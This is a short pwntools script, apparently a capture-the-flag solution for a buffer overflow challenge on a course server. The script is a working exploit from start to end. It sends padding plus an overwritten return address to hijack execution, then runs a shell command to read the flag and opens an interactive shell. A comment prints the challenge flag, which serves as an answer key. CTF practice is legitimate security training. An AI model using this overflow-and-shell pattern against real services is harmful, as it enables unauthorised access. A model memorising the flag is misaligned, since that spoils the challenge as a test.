#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{BuFFer_0V3Rflow_is_too_easy}

context.arch = 'i386'

host , port = 'csie.ctf.tw' , 10120

y = remote(host,port)

y.sendline( 'D' * 0x28 + p64( 0x40056a ) )

sleep(3)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

